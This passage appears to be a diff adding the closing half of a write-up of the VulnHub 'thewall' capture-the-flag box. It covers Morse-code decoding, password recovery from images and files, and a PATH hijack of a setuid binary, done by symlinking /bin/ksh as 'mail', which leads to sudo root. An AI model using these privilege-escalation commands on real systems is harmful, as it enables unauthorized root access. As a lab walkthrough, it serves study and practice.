@@ -502,6 +502,421 @@ $ python morse-code.py
  .....--...-............-..-..........-....-.--.......-........................-.................................................................................................................................................................--..-.--....-.-..-.....-.............-...---.-.--..--.----.........------....-.....---..........-........................................-..-....................................--.-...-......---.....-......---.-----.....-...-....-...-......---.---.-.-...---.........-..-.-............-...--.---.-.-.-.....-.....-.-......-.......--.---.-.-....-.-..-----.--.--..-----....-.--.-.-....-..----------.-...-.------.-.--.-------..-.----...-..---.-----.....-.--...........-........-.-..-....-.-...-..-.-.----............................-----.----.-.-..--..-..-....--..........-.....--..-.........-...------...--.-.-.....--.------..-------..-..--.-.....-.-...................-..-...---...-.-----.-.---.-.----..-..------.---.------------.---..-..--.-------....--.----------.--..----.--.-------.----.-.-..--.---.---...----.-..-...--.---.-..-.---.--.--.-----..---.-.--.-------......-.-..-..---.--......-..--.-..-.-....-------...-----....-...---...--..............-.......................................-.........-----.-.---.-.-....-.-.......---------...--.-.-....-..---.--...---.--......-.-...-.............-.-...-..--..-.----.................-.-............-...---.--..--....-..--.--.----.-.----..--.-.-....-----.-.--.--.------.------.----.-.-..---.-.--...--.......--.-..-.-.............-..-.-.-....--.-.---.....-...--.--...------.....---..---..........--..-.......-.....-.-.-.-.-.-.-.---.-.-.----................-............................................................................................................................................................................................................................................................................................................................................................................................................................................................-..................-..................-.....................................................................................................................................................................-........................................................................................ ..... ..... ..... . .
 ```
 
-This looked good but it seemed I had to extract noise separately and run the sox and script over it (or the other way around?). I still need to play with it.
+This looked good but it seemed I had to remove the music, create an audio that consists of only morse code and run the sox and script over it (or the other way around?). ~~I still need to play with it.~~
 
-#WIP
+Its been a while and I had no time to work on it. Apparently, this script was not perfect for this use case and I did not have enough time to work on parsing and getting the result via python code but for those who wish to have a starting point using sox. So, the way I did was listening to the audio reduced down by 30% and to one-fifth of the normal speed. I used _playitslowly_ to do this. You can hear the beep of morse codes along with the normal music but I tried to cleaned up little bit which produced [this audio file](audio/nick_mason_cleaned.ogg).
+
+You can also see the spectrum which looks much better:
+![Audacity Isolation](images/audacity_thewall.png "Audacity Isolation")
+
+This translated to `.-. .. -.-. .... .- .-. -.. .-- .-. .. --. .... - .---- ----. ....- ...-- -.-- .- .-. ..-. .. ... .-` which translated to `RICHARDWRIGHT1943YARFISA `. Google search for `richard wright yarfisa` provides autocorrected result for `richard wright farfisa` so I knew I had to adjust that.
+
+With couple of attempts, I was able to login on the server as RichardWright. I knew the username from one of the texts and previous patterns and `1943farfisa`.
+
+```shell
+$ su RichardWright
+Password:
+ksh: Cannot determine current working directory
+
+$ id
+uid=1003(RichardWright) gid=1003(RichardWright) groups=1003(RichardWright)
+```
+
+Now, did you note that there was another suid file : `/usr/local/bin/shineon` which had user:group permission of `DavidGilmour:RichardWright`. Cool.
+
+```shell
+$ /usr/local/bin/shineon
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+1
+
+     March 2016
+Su Mo Tu We Th Fr Sa
+       1  2  3  4  5
+ 6  7  8  9 10 11 12
+13 14 15 16 17 18 19
+20 21 22 23 24 25 26
+27 28 29 30 31      
+
+Time - The Dark Side of the Moon
+
+Press ENTER to continue.
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+2
+Echoes - Meddle
+RogerWaters ttyp0    Mar  9 19:35   (192.168.168.70)
+
+
+Press ENTER to continue.
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+3
+Is There Anybody Out There? - The Wall
+PING www.google.com (216.58.216.68): 56 data bytes
+64 bytes from 216.58.216.68: icmp_seq=0 ttl=57 time=13.375 ms
+64 bytes from 216.58.216.68: icmp_seq=1 ttl=57 time=13.181 ms
+64 bytes from 216.58.216.68: icmp_seq=2 ttl=57 time=13.943 ms
+--- www.google.com ping statistics ---
+3 packets transmitted, 3 packets received, 0.0% packet loss
+round-trip min/avg/max/std-dev = 13.181/13.499/13.943/0.350 ms
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+4
+Keep Talking- The Division Bell
+No mail for RichardWright
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+5
+Quitting program!
+```
+
+This quick session seemed like it would not give anything quickly but I also did notice various messages in between. More shell session:
+
+```shell
+$ cat bio.txt                                                                                                                                                                                                                          
+"Richard William "Rick" Wright (28 July 1943 – 15 September 2008) was an English musician, composer, singer and songwriter. He was a founder member, keyboardist and vocalist of the progressive rock band Pink Floyd, performing on the majority of the group's albums including The Piper at the Gates of Dawn, The Dark Side of the Moon, Wish You Were Here and The Division Bell, and playing on all of their tours.[3]
+
+Wright grew up in Hatch End in London and met future Pink Floyd bandmates Roger Waters and Nick Mason while studying at the Regent Street Polytechnic. The group found commercial success in 1967 with frontman Syd Barrett before Barrett's instability led to him being replaced by David Gilmour, with Wright taking over songwriting duties with Waters. Initially a straightforward singer / songwriter, Wright later acted as an arranger to Waters and Gilmour's compositions. He began to contribute less towards the end of the 1970s and left the band after touring The Wall in 1981. He rejoined the band as a session player in 1987 for A Momentary Lapse of Reason, and became a full-time member again for The Division Bell in 1994. Sessions with Wright during this period were later released on the album The Endless River. Away from the Floyd, Wright recorded two solo albums, including a collaboration with Anthony Moore on Broken China, and briefly formed the duo Zee. After rejoining Waters, Mason and Gilmour as Pink Floyd for Live 8 in 2005, he became part of Gilmour's regular solo touring band, singing occasional lead on songs such as "Arnold Layne", before his death in September 2008.
+
+Overshadowed by band mates Barrett, Waters and Gilmour and being the quietest and most reserved member of Pink Floyd, Wright's contributions have been overlooked, but his death brought a reappraisal and recognition of his talents. His jazz and improvisation influences and keyboard performances were an important part of the Pink Floyd sound; being a prominent player of the Farfisa and Hammond organs and the Kurzweil synthesizer. Wright sang regularly in the band, and occasionally took the lead vocal on Pink Floyd songs such as "Time", "Remember a Day" and "Wearing the Inside Out"."
+
+Source: Wikipedia (https://en.wikipedia.org/wiki/Richard_Wright_%28musician%29)
+$ cat mbox  
+From DavidGilmour@thewall.localdomain Tue Oct 27 01:41:18 2015
+Return-Path: DavidGilmour@thewall.localdomain
+Delivered-To: RichardWright@thewall.localdomain
+Received: from localhost (thewall.localdomain [local])
+        by thewall.localdomain (OpenSMTPD) with ESMTPA id 3ad74b19
+        for <RichardWright@thewall.localdomain>;
+        Tue, 27 Oct 2015 01:41:18 +1000 (AEST)
+From: David Gilmour <DavidGilmour@thewall.localdomain>
+Date: Tue, 27 Oct 2015 02:41:18 +1000 (AEST)
+Message-Id: <9059884549097248741.enqueue@thewall.localdomain>
+To: RichardWright@thewall.localdomain
+Subject: Re: Brain Damage
+Status: RO
+
+G'day Rick.. how's the ivory tickling going?
+
+There's plenty of bricks in the wall, so I'll give you a few when we catch up.
+
+For now, just use that command I gave you with the menu.
+
+Dave
+
+----------
+
+Hey Dave,
+I feel like we're back in the studio for The Dark Side of the Moon.
+Sorry to keep bugging you, but can you tell me again how to do things
+when I'm on thewall.
+Rick
+
+samar@techgaun $ scp -P 1965 RichardWright@192.168.168.39:/home/RichardWright/richard_wright_profile_pic.jpg .
+RichardWright@192.168.168.39's password:
+Permission denied, please try again.
+
+$ cp richard_wright_profile_pic.jpg /tmp && chmod a+r /tmp/richard_wright_profile_pic.jpg
+
+samar@techgaun $ scp -P 1965 RogerWaters@192.168.168.39:/tmp/richard_wright_profile_pic.jpg .
+```
+
+And, this worked fine so most likely ssh is not allowed for RichardWright.
+
+![Richard Wright](images/richard_wright_profile_pic.jpg "Richard Wright")
+
+Upon further checks, the strings returned interesting information for mail in menu.
+
+```shell
+$ strings /usr/local/bin/shineon                                                                                                                                                                                                       
+/usr/libexec/ld.so
+OpenBSD
+OpenBSD
+libc.so.80.1
+printf
+__stack_smash_handler
+__srget
+getc
+puts
+system
+_thread_atfork
+environ
+__progname
+__cxa_atexit
+__sF
+__isthreaded
+scanf
+_Jv_RegisterClasses
+__got_start
+__got_end
+__data_start
+_edata
+__bss_start
+__progname_storage
+__fini
+__init_tcb
+QRP1
+[^_]
+Menu
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+Quitting program!
+Invalid choice!
+load_menu
+Time - The Dark Side of the Moon
+/usr/bin/cal
+Press ENTER to continue.
+Echoes - Meddle
+/usr/bin/who
+Is There Anybody Out There? - The Wall
+/sbin/ping -c 3 www.google.com
+Keep Talking- The Division Bell
+mail
+```
+
+While other executables have full path, mail does not have. That means, we can potentially specify the path in such a way that we can execute our own executable before the actual mail executable is executed.
+
+```shell
+$ echo $PATH
+/home/RichardWright/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/usr/local/bin:/usr/local/sbin:/usr/games:.
+
+$ ln -s /bin/ksh /tmp/mail
+
+$ export PATH=/tmp:$PATH
+
+$ shineon
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+4
+Keep Talking- The Division Bell
+mail: Cannot determine current working directory
+$ whoami
+DavidGilmour
+```
+
+This is perfect. We're now DavidGilmour. I believe we are very near here and I play some more shell game.
+
+```shell
+$ cat anotherbrick.txt                                                                                                                                                                                                                 
+# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond
+
+New website for review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php
+
+# You have to be trusted by the people you lie to. So that when they turn their backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs
+$ cat bio.txt
+"David Jon Gilmour, CBE (born 6 March 1946), is an English musician, singer, songwriter and multi-instrumentalist. In a career spanning more than 50 years, he is best known[1] for his work as the guitarist and co-lead vocalist of the progressive rock band Pink Floyd. It was estimated that by 2012 the group had sold over 250 million records worldwide, including 75 million units sold in the United States.[2]
+
+In addition to his work with Pink Floyd, Gilmour has produced a variety of artists, for example the Dream Academy, and has had a solo career. In 2005, Gilmour was made a Commander of the Order of the British Empire (CBE) for his services to music.[3] He was awarded with the Outstanding Contribution title at the 2008 Q Awards.[4] In 2011, Rolling Stone magazine ranked him number 14 in their list of the greatest guitarists of all time. Additionally, Gilmour was voted number 36 in the greatest voices in rock by Planet Rock listeners in 2009."
+
+Source: Wikipedia (https://en.wikipedia.org/wiki/David_Gilmour)
+$ cat mbox
+From RichardWright@thewall.localdomain Tue Oct 27 01:41:18 2015
+Return-Path: RichardWright@thewall.localdomain
+Delivered-To: DavidGilmour@thewall.localdomain
+Received: from localhost (thewall.localdomain [local])
+        by thewall.localdomain (OpenSMTPD) with ESMTPA id 3ad74b19
+        for <DavidGilmour@thewall.localdomain>;
+        Tue, 27 Oct 2015 01:41:18 +1000 (AEST)
+From: Richard Wright <RichardWright@thewall.localdomain>
+Date: Tue, 27 Oct 2015 01:41:18 +1000 (AEST)
+Message-Id: <4059885549097245741.enqueue@thewall.localdomain>
+To: DavidGilmour@thewall.localdomain
+Subject: Brain Damage
+Status: RO
+
+Hey Dave,
+I feel like we're back in the studio for The Dark Side of the Moon.
+Sorry to keep bugging you, but can you tell me again how to do things
+when I'm on thewall.
+Rick
+
+$ ls -liah .private/
+total 8
+24597 drwx------  2 DavidGilmour  DavidGilmour   512B Oct 26 11:44 .
+24585 drwx------  4 DavidGilmour  DavidGilmour   512B Oct 28 09:28 ..
+
+$ chmod a+r /tmp/david_gilmour_profile_pic.jpg
+```
+
+Visiting http://192.168.168.39/pinkfloyd1965newblogsite50yearscelebration-temp/index.php gives us a new site. Trying file inclusion based on the page variable didn't work but I also had gotten the profile picture of David and turns out it was an image but exif analysis gave error unlike other images.
+
+![David Gilmour](images/david_gilmour_profile_pic.jpg "David Gilmour")
+
+```shell
+$ exif david_gilmour_profile_pic.jpg
+Corrupt data
+The data provided does not follow the specification.
+ExifLoader: The data supplied does not seem to contain EXIF data.
+
+$ strings david_gilmour_profile_pic.jpg | grep '.\{6\}'
+---redacted---
+who_are_you_and_who_am_i
+```
+
+However, I could not figure anything from the image anyway. But the output of strings was interesting esp. the string `who_are_you_and_who_am_i`. Quick view of the html source of homepage revealed HTML comment as below:
+
+`Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
+Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?`
+
+I also saw two images and having had to play with steganography on this same challenge, I suspected this might be something in the same line. After playing a while with light levels and brightness, it did reveal some secrets in the home page image.
+
+![Homepage Img](images/homepage_modified.gif "Homepage Img")
+
+Zooming in and checking the texts, it suggested a path `/welcometothemachine` and some sort of hash: `50696e6b466c6f796435305965617273`. The hash is 32 characters long suggesting it must be MD5 hash. That's good but trying to crack with several online services does not give any result. :(
+
+I started setting up oclhashcat and in the meantime, I thought if it was some text encoded in hex. I went to my own [encoder decoder](http://nepali.netau.net/enc_dec/) and boom! It gave the text: `PinkFloyd50Years`. Trying to load `http://192.168.168.39/welcometothemachine/` gave me 403 Forbidden but since I had shell, I could try searching for this directory on the server itself. I knew there was a `/var/www` directory but `htdocs` was not accessible. I then went ahead with trying the previously found string `who_are_you_and_who_am_i` as the password for DavidGilmour and that worked :D
+
+```shell
+$ su DavidGilmour
+Password:
+$ whoami
+DavidGilmour
+$ cd /var/www/htdocs/
+$ ls -liah
+total 244
+51520 drwxr-x---   4 www   welcometothemachine   512B Nov 27 01:47 .
+51510 drwxr-xr-x  11 root  daemon                512B Oct 27 03:35 ..
+52890 -rw-r--r--   1 www   www                   539B Oct 25 01:20 index.html
+51518 -rw-r--r--   1 www   www                   112K Oct 25 01:16 pink_floyd.jpg
+53142 drwxr-xr-x   7 www   www                   512B Aug  8  2015 pinkfloyd1965newblogsite50yearscelebration-temp
+53069 drwxr-xr-x   2 root  welcometothemachine   512B Aug  8  2015 welcometothemachine
+$ ls -liah welcometothemachine/
+total 24
+53069 drwxr-xr-x  2 root  welcometothemachine   512B Aug  8  2015 .
+51520 drwxr-x---  4 www   welcometothemachine   512B Nov 27 01:47 ..
+53071 -rws--s---  1 root  welcometothemachine   7.3K Nov 27 01:47 PinkFloyd
+```
+
+Well, one more binary with setuid bit? Cool! But, we are `DavidGilmour` right now. Lets see which users are in `welcometothemachine` user group.
+
+```shell
+$ grep "welcometothemachine" /etc/group
+welcometothemachine:*:1005:DavidGilmour
+```
+
+Cool, we're in the group. So, lets try to run this thing then.
+
+```shell
+$ ./PinkFloyd
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: PinkFloyd50Years
+
+$ ./PinkFloyd
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: Brain Damage
+
+Denied....
+If I had my way, I'd have all of ya shot. - Pink Floyd, In The Flesh
+```
+
+I tried couple more answers but I could not find my way through this. I also checked the files in `/var/www/htdocs` but nothing interesting or new.
+
+Oh well maybe the hex string itself might be the password. I tried `PinkFloyd50Years` but not its hex. This didn't trigger me immediately though.
+
+```shell
+$ ./PinkFloyd                                                                                                                                                                                                                          
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: 50696e6b466c6f796435305965617273
+
+Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless
+
+Congratulations... permission has been granted.
+You can now set your controls to the heart of the sun!
+
+$ whoami
+DavidGilmour
+$ sudo su
+Password:
+# cd /root/
+# ls
+.Xdefaults .cshrc     .cvsrc     .login     .profile   .ssh       flag.txt   scripts    tmp
+# cat flag.txt
+
+"The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar"
+
+                   Congratulations on rooting thewall!
+
+   ___________________________________________________________________
+  | |       |       |       |       |       |       |       |       | |
+  |_|_______|_______|______ '__  ___|_______|_______|_______|_______|_|
+  |     |       |       |   |  )      /         |       |       |     |
+  |_____|_______|_______|__ |,' , .  | | _ , ___|_______|_______|_____|
+  | |       |       |      ,|   | |\ | | ,' |       |       |       | |
+  |_|_______|_______|____ ' | _ | | \| |'\ _|_______|_______|_______|_|
+  |     |       |       |   \  _' '  ` |  \     |       |       |     |
+  |_____|_______|_______|_  ,-'_ _____ | _______|_______|_______|_____|
+  | |       |       |   ,-'|  _     |       |       |       |       | |
+  |_|_______|_______|__  ,-|-' |  ,-. \ /_.--. _____|_______|_______|_|
+  |     |       |          |   |  | |  V  |   ) |       |       |     |
+  |_____|_______|_______|_ | _ |-'`-'  |  | ,' _|_______|_______|_____|
+  | |       |       |      |        |  '  ;'        |       |       | |
+  |_|_______|_______|______"|_____  _,- o'__|_______|_______|_______|_|
+  |     |       |       |       _,-'    .       |       |       |     |
+  |_____|_______|_______|_ _,--'\      _,-'_____|_______|_______|_____|
+  | |       |       |     '     ||_||-' _   |       |       |       | |
+  |_|_______|_______|_______|__ || ||,-'  __|_______|_______|_______|_|
+  |     |       |       |       |  ||_,-'       |       |       |     |
+  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
+  | |       |       |   \    |     /        |       |       |       | |
+  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
+  |     |       |       | \      // \   |   |   |       |       |     |
+  |_____|_______|_______|_ \ /\ //--'\  |   | __|_______|_______|_____|
+  | |       |       |       '  V/    |  |-' |__,    |       |       | |
+  |_|_______|_______|_______|_______ _______'_______|_______|_______|_|
+  |     |       |       |       |       |       |       |       |     |
+  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
+  |_________|_______|_______|_______|_______|_______|_______|_______|_|
+
+                  Celebrating 50 years of Pink Floyd!
+             Syd Barrett (RIP), Nick Mason, Roger Waters,
+               Richard Wright (RIP), and David Gilmour.
+
+
+** Shoutouts **
++ @vulnhub for making it all possible
++ @rastamouse @thecolonial - "the test bunnies"
+
+-=========================================-
+-  xerubus (@xerubus - www.mogozobo.com)  -
+-=========================================-
+```
+
+Initially, I thought the result was the root access but it seemed I got sudo access for the user `DavidGilmour` and it turned out to be true.
+
+After getting the flag and root access, I browsed through /root/scripts directory and saw how things were put together. This was the most fun CTF so far because there were times when I was challenged and had to refresh my brain a lot.
+
+Game Over!
